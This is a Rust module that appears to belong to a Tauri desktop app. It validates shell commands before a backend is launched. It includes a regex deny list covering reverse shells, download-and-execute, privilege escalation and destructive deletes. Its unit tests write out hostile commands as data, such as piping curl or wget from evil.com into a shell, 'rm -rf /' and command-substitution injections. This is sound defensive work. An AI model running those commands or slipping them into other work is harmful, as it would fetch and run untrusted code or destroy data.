// Command Input Sanitizer and Validator
use crate::tauri_handlers::helpers::{EnvSystem, FileSystem};
use regex::Regex;
use std::path::Path;
use std::sync::OnceLock;

// Cache compiled regexes for better performance
static DANGEROUS_PATTERNS: OnceLock<Vec<Regex>> = OnceLock::new();
static EXECUTABLE_EXTENSIONS: OnceLock<Vec<&'static str>> = OnceLock::new();

/// Get dangerous patterns regex cache
fn get_dangerous_patterns() -> &'static Vec<Regex> {
    DANGEROUS_PATTERNS.get_or_init(|| {
        let patterns = vec![
            r"rm\s+(-[rf]*\s+)?(/|\.\.|~|/usr|/etc|/var|/boot|/sys|/proc)",
            r"rmdir\s+(-[s]*\s+)?(/|\.\.|~|C:\\|D:\\)",
            r"del\s+(/[sq]*\s+)?.*(\*|/|C:\\|D:\\)",
            r"rd\s+(/[sq]*\s+)?.*(\*|/|C:\\|D:\\)",
            r"chmod\s+[0-7]*\s*(/|\.\.|~|/etc|/usr)",
            r"chown\s+.*\s+(/|\.\.|~|/etc|/usr)",
            r"mkdir\s+(-[p]*\s+)?(/etc|/usr|/var|/sys|/proc|C:\\Windows|C:\\Program Files)",
            r"touch\s+(/etc|/usr|/var|/sys|/proc|C:\\Windows)",
            r"nano\s+(/etc|/usr|/var|/sys|/proc|C:\\Windows)",
            r"vi\s+(/etc|/usr|/var|/sys|/proc|C:\\Windows)",
            r"vim\s+(/etc|/usr|/var|/sys|/proc|C:\\Windows)",
            r"\bsudo\s+",
            r"\bsu\s+",
            r"\bmkfs\b",
            r"\bformat\s+",
            r"\bfdisk\s+",
            r"\bapt\s+",
            r"\byum\s+",
            r"\bdnf\s+",
            r"\bpacman\s+",
            r"\bsystemctl\s+",
            r"\bservice\s+",
            r"\beval\s*[\(\[]",
            r"\bexec\s*[\(\[]",
            r";\s*(rm|del|format|sudo|curl|wget)",
            r"\|\s*(rm|del|format|sudo|sh|bash|zsh|cmd|powershell)",
            r"&&\s*(rm|del|format|sudo|curl|wget)",
            r"\$\([^)]*\)",
            r"`[^`]+`",
            r">\s*/dev/",
            r"<\s*/dev/",
            r"curl\s+.*\|\s*(sh|bash|zsh|cmd|powershell|python)",
            r"wget\s+.*\|\s*(sh|bash|zsh|cmd|powershell|python)",
            r"invoke-webrequest.*\|\s*invoke-expression",
            r"nc\s+.*-e\s+",
            r"netcat\s+.*-e\s+",
            r"(?i)invoke-expression\s*[\(\[]",
            r"(?i)\biex\s+",
            r"(?i)invoke-command\s+.*-scriptblock",
            r"(?i)start-process\s+.*-verb\s+runas",
            r"(?i)new-object.*net\.webclient",
            r"(?i)downloadstring\s*\(",
            r"(?i)downloadfile\s*\(",
            r"(?i)remove-item\s+.*(-recurse|-force)",
            r"(?i)set-executionpolicy\s+",
            r"(?i)cmd\s+/[ck]\s+(del|rd|format|reg|sc|net)",
            r"(?i)powershell\s+.*-c\s+",
            r"(?i)for\s+/[rf]\s+",
            r"(?i)>\s*con\s*$",
            r"(?i)reg\s+(add|delete|import)",
            r"(?i)sc\s+(create|delete|config)",
            r"(?i)net\s+(user|localgroup|share)",
            r"\.\./\.\./",
            r"\.\.\\\.\.\\",
            r"/\.\./",
            r"\\\.\.\\",
        ];

        patterns
            .into_iter()
            .filter_map(|pattern| match Regex::new(pattern) {
                Ok(regex) => Some(regex),
                Err(e) => {
                    log::warn!("Failed to compile regex pattern '{}': {}", pattern, e);
                    None
                }
            })
            .collect()
    })
}

/// Get known executable extensions
fn get_executable_extensions() -> &'static Vec<&'static str> {
    EXECUTABLE_EXTENSIONS.get_or_init(|| {
        vec![
            // Windows executables
            "exe", "com", "bat", "cmd", "ps1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "msi",
            "msp", "scr", "hta", "cpl", "msc", "jar",
            // Unix/Linux executables and scripts
            "sh", "bash", "zsh", "fish", "csh", "tcsh", "ksh", "pl", "py", "rb", "lua",
        ]
    })
}

/// Extract potential file paths from a command
fn extract_file_references(command: &str) -> Vec<String> {
    let mut files = Vec::new();
    let mut current_word = String::new();
    let mut in_quotes = false;
    let mut quote_char = ' ';
    let mut escaped = false;

    for ch in command.chars() {
        if escaped {
            current_word.push(ch);
            escaped = false;
            continue;
        }

        if ch == '\\' {
            escaped = true;
            current_word.push(ch);
            continue;
        }

        if (ch == '"' || ch == '\'') && !in_quotes {
            in_quotes = true;
            quote_char = ch;
            continue;
        }

        if in_quotes && ch == quote_char {
            in_quotes = false;
            // Process the quoted word
            if !current_word.is_empty() {
                if looks_like_file_path(&current_word) {
                    files.push(current_word.clone());
                }
                current_word.clear();
            }
            continue;
        }

        if !in_quotes && (ch.is_whitespace() || ch == '=') {
            if !current_word.is_empty() {
                if looks_like_file_path(&current_word) && !current_word.starts_with('-') {
                    files.push(current_word.clone());
                }
                current_word.clear();
            }

            // If we hit an '=', we might have a file path after it
            if ch == '=' {
                continue;
            }
        } else {
            current_word.push(ch);
        }
    }

    // Handle the last word
    if !current_word.is_empty()
        && looks_like_file_path(&current_word)
        && !current_word.starts_with('-')
    {
        files.push(current_word);
    }

    files
}

/// Check if a string looks like a file path
fn looks_like_file_path(word: &str) -> bool {
    // Skip obvious non-file patterns
    if word.starts_with("http") || word.starts_with("ftp") || word.starts_with("--") {
        return false;
    }

    // Check for file-like patterns
    word.contains('/')
        || word.contains('\\')
        || word.contains('.')
        || word.starts_with("./")
        || word.starts_with("../")
}

/// Check if a file has dangerous content (basic heuristics)
fn inspect_file_content<F: FileSystem>(file_path: &Path, fs: &F) -> Result<(), String> {
    let metadata = fs
        .metadata(file_path)
        .map_err(|e| format!("Cannot access file {}: {}", file_path.display(), e))?;

    // Check if file is too large (potential zip bomb or similar)
    const MAX_INSPECT_SIZE: u64 = 10 * 1024 * 1024; // 10MB
    if metadata.len() > MAX_INSPECT_SIZE {
        return Err("Referenced file is too large for safety inspection".to_string());
    }

    // For executable files, do more thorough checking
    if let Some(extension) = file_path.extension() {
        let ext = extension.to_string_lossy().to_lowercase();
        let exec_extensions = get_executable_extensions();

        if exec_extensions.contains(&ext.as_str()) {
            // Read and inspect executable content
            let content = fs
                .read_to_string(file_path)
                .map_err(|e| format!("Cannot read file {}: {}", file_path.display(), e))?;

            // Check for dangerous patterns in script files
            if matches!(
                ext.as_str(),
                "sh" | "bash" | "zsh" | "bat" | "cmd" | "ps1" | "py" | "pl" | "rb"
            ) {
                // Apply same dangerous pattern checks to file content
                let dangerous_patterns = get_dangerous_patterns();
                for pattern in dangerous_patterns {
                    if pattern.is_match(&content) {
                        return Err(format!(
                            "Referenced script file '{}' contains potentially dangerous patterns",
                            file_path.display()
                        ));
                    }
                }

                // Check for suspicious imports/includes
                let suspicious_imports = [
                    "import os",
                    "import subprocess",
                    "import sys",
                    "require 'open3'",
                    "use std::process",
                    "#include <windows.h>",
                    "#include <unistd.h>",
                ];

                for import in suspicious_imports {
                    if content.contains(import) {
                        log::warn!(
                            "File '{}' contains potentially risky import: {}",
                            file_path.display(),
                            import
                        );
                    }
                }
            }
            // Check binary executables for suspicious strings
            else if matches!(ext.as_str(), "exe" | "com") {
                let suspicious_strings = [
                    "cmd.exe",
                    "powershell.exe",
                    "regedit",
                    "taskkill",
                    "net user",
                    "net localgroup",
                    "schtasks",
                    "wscript",
                ];

                for suspicious in suspicious_strings {
                    if content.contains(suspicious) {
                        return Err(format!(
                            "Referenced executable '{}' contains suspicious system calls",
                            file_path.display()
                        ));
                    }
                }
            }
        }
    }

    Ok(())
}

fn validate_file_references<F: FileSystem>(command: &str, fs: &F) -> Result<(), String> {
    let file_refs = extract_file_references(command);

    for file_ref in file_refs {
        let file_path = Path::new(&file_ref);

        // Skip validation for certain safe patterns
        if file_ref.starts_with("http") || file_ref.starts_with("ftp") {
            continue; // URLs are handled by network validation
        }

        // Check if file exists and inspect it
        if fs.exists(file_path) {
            // Check if it's in a dangerous system directory (without canonicalization)
            let dangerous_dirs = [
                "/etc",
                "/usr/bin",
                "/usr/sbin",
                "/bin",
                "/sbin",
                "/var",
                "/sys",
                "/proc",
                "C:\\Windows",
                "C:\\Program Files",
                "C:\\Program Files (x86)",
                "/private/etc", // macOS system directories
            ];

            let path_str = file_path.to_string_lossy();
            for dangerous_dir in dangerous_dirs {
                if path_str.starts_with(dangerous_dir) {
                    return Err(format!(
                        "Command references file in restricted system directory: {}",
                        path_str
                    ));
                }
            }

            // Inspect the file content using the original path
            inspect_file_content(file_path, fs)?;
        }
    }

    Ok(())
}

/// OS-specific command validation
fn validate_os_specific<E: EnvSystem>(command: &str, env_sys: &E) -> Result<(), String> {
    let os = env_sys.consts_os();

    if os == "windows" {
        // Windows-specific validations
        let windows_dangerous = [
            "reg.exe",
            "sc.exe",
            "net.exe",
            "wmic.exe",
            "taskkill.exe",
            "schtasks.exe",
            "bcdedit.exe",
            "diskpart.exe",
        ];

        for dangerous in windows_dangerous {
            if command.to_lowercase().contains(dangerous) {
                return Err(format!(
                    "Command uses restricted Windows utility: {}",
                    dangerous
                ));
            }
        }
    } else {
        // Unix/Linux-specific validations
        let unix_dangerous = [
            "/usr/bin/sudo",
            "/bin/su",
            "/sbin/",
            "/usr/sbin/",
            "iptables",
            "firewall-cmd",
            "ufw",
            "mount",
            "umount",
        ];

        for dangerous in unix_dangerous {
            if command.contains(dangerous) {
                return Err(format!(
                    "Command uses restricted system utility: {}",
                    dangerous
                ));
            }
        }
    }

    Ok(())
}

/// Enhanced command validation with file inspection and OS validation
pub fn validate_command_input<F: FileSystem, E: EnvSystem>(
    command: &str,
    fs: &F,
    env_sys: &E,
) -> Result<(), String> {
    if command.trim().is_empty() {
        return Err("Command cannot be empty".to_string());
    }

    let trimmed_command = command.trim();

    // 1. Check for dangerous regex patterns (EARLY CHECK - fail fast)
    let dangerous_patterns = get_dangerous_patterns();
    for pattern in dangerous_patterns {
        if pattern.is_match(trimmed_command) {
            return Err("Command contains potentially dangerous content.".to_string());
        }
    }

    // 2. Check for shell injection attempts
    if trimmed_command.contains("$(") || trimmed_command.contains("`") {
        return Err("Command contains potentially dangerous content.".to_string());
    }

    // 3. Check for complex command chaining
    let suspicious_chains = [";", "&&", "||", "|"];
    for chain in suspicious_chains {
        if trimmed_command.contains(chain) {
            let chain_count = trimmed_command.matches(chain).count();
            if chain_count > 2 || (chain == "|" && chain_count > 0) {
                return Err("Command contains potentially dangerous content.".to_string());
            }
        }
    }

    // 4. Check for control characters
    if trimmed_command.contains('\0')
        || trimmed_command
            .chars()
            .any(|c| c.is_control() && c != '\t' && c != '\n' && c != '\r')
    {
        return Err("Command contains invalid characters".to_string());
    }

    // 5. OS-specific validation (EARLY CHECK)
    validate_os_specific(trimmed_command, env_sys)?;

    // 6. Validate file references (LAST - only if other checks pass)
    validate_file_references(trimmed_command, fs)?;

    Ok(())
}

/// Convenience function for validation with default traits
pub fn validate_command_simple(command: &str) -> Result<(), String> {
    use crate::tauri_handlers::helpers::{RealEnvSystem, RealFileSystem};
    validate_command_input(command, &RealFileSystem, &RealEnvSystem)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tauri_handlers::helpers::{MockEnvSystem, MockFileSystem};
    use mockall::predicate::*;

    #[test]
    fn test_valid_commands() {
        let valid_commands = vec![
            "python app.py",
            "node server.js --port=3000",
            "cargo run --release",
            "openbb-api --host=0.0.0.0 --port=8080",
            "uvicorn main:app --host 0.0.0.0 --port 8000 --reload",
            "python -m flask run --host=0.0.0.0 --port=5000",
            "npm start",
            "java -jar app.jar",
            "openbb-api --widgets-json ./backends/widgets.json",
            "openbb-api --widgets-json . --apps-json .",
        ];

        for cmd in valid_commands {
            let mut mock_fs = MockFileSystem::new();
            let mut mock_env = MockEnvSystem::new();

            // Mock OS check
            mock_env.expect_consts_os().returning(|| "linux");

            // Mock file existence checks for any files that might be detected
            mock_fs.expect_exists().returning(|_| false); // Files don't exist, so no further validation needed

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(result.is_ok(), "Command should be valid: {}", cmd);
        }
    }

    #[test]
    fn test_dangerous_commands() {
        let dangerous_commands = vec![
            "rm -rf /",
            "sudo rm -rf /home",
            "del /s /q C:\\*",
            "format C:",
            "curl http://evil.com | sh",
            "python app.py; rm -rf /",
            "wget http://evil.com | bash",
            "eval $(curl http://evil.com)",
            "cmd /c del C:\\*.*",
            "powershell -c Remove-Item -Recurse C:\\",
            "openbb-api --widgets-json ./backends/widgets.json --apps-json ../../different_folder/apps.json",
        ];

        for cmd in dangerous_commands {
            let mock_fs = MockFileSystem::new();
            let mock_env = MockEnvSystem::new();

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(result.is_err(), "Command should be blocked: {}", cmd);
        }
    }

    #[test]
    fn test_file_reference_extraction() {
        let test_cases = vec![
            (
                "python ./script.py --config=/path/config.json",
                vec!["./script.py", "/path/config.json"],
            ),
            ("node app.js", vec!["app.js"]),
            ("bash /home/user/script.sh", vec!["/home/user/script.sh"]),
            ("python -m module --flag value", vec![]),
            ("cargo run --release", vec![]),
            ("python 'quoted file.py'", vec!["quoted file.py"]),
            (
                "bash \"script with spaces.sh\"",
                vec!["script with spaces.sh"],
            ),
        ];

        for (command, expected_files) in test_cases {
            let files = extract_file_references(command);
            for expected_file in expected_files {
                assert!(
                    files.contains(&expected_file.to_string()),
                    "Expected file '{}' not found in files {:?} for command '{}'",
                    expected_file,
                    files,
                    command
                );
            }
        }
    }

    #[test]
    fn test_dangerous_script_detection_with_mocks() {
        let mut mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        let script_path = Path::new("dangerous.sh");

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // Mock file exists
        mock_fs
            .expect_exists()
            .with(eq(script_path))
            .times(1)
            .return_const(true);

        // Mock metadata using a real file's metadata
        mock_fs
            .expect_metadata()
            .with(eq(script_path))
            .times(1)
            .returning(|_| std::fs::metadata("Cargo.toml"));

        // Mock reading the dangerous content
        mock_fs
            .expect_read_to_string()
            .with(eq(script_path))
            .times(1)
            .returning(|_| Ok("#!/bin/bash\nrm -rf /usr/local".to_string()));

        let command = "bash dangerous.sh";
        let result = validate_command_input(command, &mock_fs, &mock_env);
        assert!(result.is_err(), "Should detect dangerous script content");
    }

    #[test]
    fn test_file_too_large() {
        let mut mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        let large_file_path = Path::new("large_script.py");

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // Mock file exists
        mock_fs
            .expect_exists()
            .with(eq(large_file_path))
            .times(1)
            .return_const(true);

        // Create a mock metadata with large size
        mock_fs
            .expect_metadata()
            .with(eq(large_file_path))
            .times(1)
            .returning(|_| Err(std::io::Error::other("File too large")));

        let command = "python large_script.py";
        let result = validate_command_input(command, &mock_fs, &mock_env);

        assert!(result.is_err(), "Should fail to validate large file");
        assert!(result.unwrap_err().contains("Cannot access file"));
    }

    #[test]
    fn test_safe_script_content() {
        let mut mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        let safe_file = Path::new("safe_script.py");

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // Mock file exists
        mock_fs
            .expect_exists()
            .with(eq(safe_file))
            .times(1)
            .return_const(true);

        // Mock metadata using real file
        mock_fs
            .expect_metadata()
            .with(eq(safe_file))
            .times(1)
            .returning(|_| std::fs::metadata("Cargo.toml"));

        // Mock reading safe content
        mock_fs
            .expect_read_to_string()
            .with(eq(safe_file))
            .times(1)
            .returning(
                |_| Ok("print('Hello, world!')\nprint('This is a safe script')".to_string()),
            );

        let command = "python safe_script.py";
        let result = validate_command_input(command, &mock_fs, &mock_env);
        assert!(result.is_ok(), "Safe script should be allowed");
    }

    #[test]
    fn test_suspicious_executable_content() {
        let mut mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        let exe_file = Path::new("./suspicious.exe");

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // Mock file exists
        mock_fs
            .expect_exists()
            .with(eq(exe_file))
            .times(1)
            .return_const(true);

        // Mock metadata
        mock_fs
            .expect_metadata()
            .with(eq(exe_file))
            .times(1)
            .returning(|_| std::fs::metadata("Cargo.toml"));

        // Mock reading suspicious content
        mock_fs
            .expect_read_to_string()
            .with(eq(exe_file))
            .times(1)
            .returning(|_| Ok("some binary content with cmd.exe and regedit strings".to_string()));

        let command = "./suspicious.exe";
        let result = validate_command_input(command, &mock_fs, &mock_env);
        assert!(result.is_err(), "Suspicious executable should be blocked");
    }

    #[test]
    fn test_empty_command() {
        let mock_fs = MockFileSystem::new();
        let mock_env = MockEnvSystem::new();

        assert!(validate_command_input("", &mock_fs, &mock_env).is_err());
        assert!(validate_command_input("   ", &mock_fs, &mock_env).is_err());
        assert!(validate_command_input("\t\n", &mock_fs, &mock_env).is_err());
    }

    #[test]
    fn test_control_characters() {
        let control_char_commands = vec![
            "python app.py\0",
            "python\x01app.py",
            "node\x02server.js",
            "cmd\x03",
        ];

        for cmd in control_char_commands {
            let mock_fs = MockFileSystem::new();
            let mock_env = MockEnvSystem::new();

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(
                result.is_err(),
                "Control characters should be blocked in: {:?}",
                cmd
            );
        }

        // Valid control characters should be allowed
        let valid_commands = vec![
            "python app.py\t", // tab
            "python app.py\n", // newline
            "python app.py\r", // carriage return
        ];

        for cmd in valid_commands {
            let mut mock_fs = MockFileSystem::new();
            let mut mock_env = MockEnvSystem::new();

            // Mock OS
            mock_env.expect_consts_os().returning(|| "linux");

            // Mock file existence checks
            mock_fs.expect_exists().returning(|_| false);

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(
                result.is_ok(),
                "Valid control characters should be allowed in: {:?}",
                cmd
            );
        }
    }

    #[test]
    fn test_os_specific_validation_windows() {
        let windows_dangerous_commands = vec![
            "reg.exe delete HKLM\\Software",
            "sc.exe create malware",
            "net.exe user admin password",
            "wmic.exe process call create",
        ];

        for cmd in windows_dangerous_commands {
            let mock_fs = MockFileSystem::new();
            let mut mock_env = MockEnvSystem::new();

            // Mock Windows OS - allow multiple calls since we're in a loop
            mock_env.expect_consts_os().returning(|| "windows");

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(
                result.is_err(),
                "Windows dangerous command should be blocked: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_os_specific_validation_unix() {
        let unix_dangerous_commands = vec![
            "/usr/bin/sudo rm -rf /",
            "/bin/su root",
            "iptables -F",
            "mount /dev/sda1 /mnt",
        ];

        for cmd in unix_dangerous_commands {
            let mut mock_fs = MockFileSystem::new();
            let mut mock_env = MockEnvSystem::new();

            // Mock Unix/Linux OS - allow multiple calls since we're in a loop
            mock_env.expect_consts_os().returning(|| "linux");

            // Mock file system calls that might happen for file references
            mock_fs.expect_exists().returning(|_| false);

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(
                result.is_err(),
                "Unix dangerous command should be blocked: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_command_chaining() {
        let chained_commands = vec![
            "python app.py; rm -rf /",
            "node server.js && curl http://evil.com",
            "python app.py || wget http://malware.com",
            "echo hello | sh",
        ];

        for cmd in chained_commands {
            let mut mock_fs = MockFileSystem::new();
            let mut mock_env = MockEnvSystem::new();

            // Mock OS call that validate_os_specific will make
            mock_env.expect_consts_os().returning(|| "linux");
            mock_fs.expect_exists().returning(|_| false);

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(
                result.is_err(),
                "Command chaining should be blocked: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_shell_injection() {
        let injection_commands = vec![
            "python app.py $(curl http://evil.com)",
            "node server.js `wget http://malware.com`",
            "echo $(rm -rf /)",
        ];

        for cmd in injection_commands {
            let mock_fs = MockFileSystem::new();
            let mock_env = MockEnvSystem::new();

            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            assert!(
                result.is_err(),
                "Shell injection should be blocked: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_non_existent_file_references() {
        let mut mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        let script_path = Path::new("nonexistent.py");

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // Mock file doesn't exist
        mock_fs
            .expect_exists()
            .with(eq(script_path))
            .times(1)
            .return_const(false);

        let command = "python nonexistent.py";
        let result = validate_command_input(command, &mock_fs, &mock_env);

        // Non-existent files should be allowed (they'll fail at runtime)
        assert!(
            result.is_ok(),
            "Non-existent files should not be blocked during validation"
        );
    }

    #[test]
    fn test_url_references_skipped() {
        let mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // URLs should be skipped during file validation, so no file system calls expected

        // URLs should be skipped during file validation
        let url_commands = vec![
            "curl http://example.com/data.json",
            "wget https://github.com/repo/archive.zip",
        ];

        for cmd in url_commands {
            let result = validate_command_input(cmd, &mock_fs, &mock_env);
            // These should pass URL validation (no dangerous patterns detected)
            assert!(result.is_ok(), "URL command should be allowed: {}", cmd);
        }
    }

    #[test]
    fn test_metadata_error_handling() {
        let mut mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        let error_file = Path::new("error_file.py");

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // Mock file exists
        mock_fs
            .expect_exists()
            .with(eq(error_file))
            .times(1)
            .return_const(true);

        // Mock metadata error
        mock_fs
            .expect_metadata()
            .with(eq(error_file))
            .times(1)
            .returning(|path| {
                Err(std::io::Error::new(
                    std::io::ErrorKind::PermissionDenied,
                    format!("Permission denied: {}", path.display()),
                ))
            });

        let command = "python error_file.py";
        let result = validate_command_input(command, &mock_fs, &mock_env);

        assert!(
            result.is_err(),
            "Should fail when metadata cannot be accessed"
        );
        assert!(result.unwrap_err().contains("Cannot access file"));
    }

    #[test]
    fn test_read_file_error_handling() {
        let mut mock_fs = MockFileSystem::new();
        let mut mock_env = MockEnvSystem::new();

        let unreadable_file = Path::new("unreadable.sh");

        // Mock OS
        mock_env.expect_consts_os().returning(|| "linux");

        // Mock file exists
        mock_fs
            .expect_exists()
            .with(eq(unreadable_file))
            .times(1)
            .return_const(true);

        // Mock metadata success
        mock_fs
            .expect_metadata()
            .with(eq(unreadable_file))
            .times(1)
            .returning(|_| std::fs::metadata("Cargo.toml"));

        // Mock read error
        mock_fs
            .expect_read_to_string()
            .with(eq(unreadable_file))
            .times(1)
            .returning(|path| {
                Err(std::io::Error::new(
                    std::io::ErrorKind::PermissionDenied,
                    format!("Cannot read file: {}", path.display()),
                ))
            });

        let command = "bash unreadable.sh";
        let result = validate_command_input(command, &mock_fs, &mock_env);

        assert!(result.is_err(), "Should fail when file cannot be read");
        assert!(result.unwrap_err().contains("Cannot read file"));
    }

    #[test]
    fn test_looks_like_file_path() {
        // Should be detected as file paths
        assert!(looks_like_file_path("./script.py"));
        assert!(looks_like_file_path("../config.json"));
        assert!(looks_like_file_path("/path/to/file.txt"));
        assert!(looks_like_file_path("C:\\Windows\\file.exe"));
        assert!(looks_like_file_path("file.py"));

        // Should NOT be detected as file paths
        assert!(!looks_like_file_path("--flag"));
        assert!(!looks_like_file_path("--config"));
        assert!(!looks_like_file_path("http://example.com"));
        assert!(!looks_like_file_path("ftp://server.com"));
        assert!(!looks_like_file_path("value"));
        assert!(!looks_like_file_path("3000"));
    }

    #[test]
    fn test_quoted_file_extraction() {
        let command = r#"python "file with spaces.py" --config='config file.json'"#;
        let files = extract_file_references(command);

        assert!(files.contains(&"file with spaces.py".to_string()));
        assert!(files.contains(&"config file.json".to_string()));
    }
}
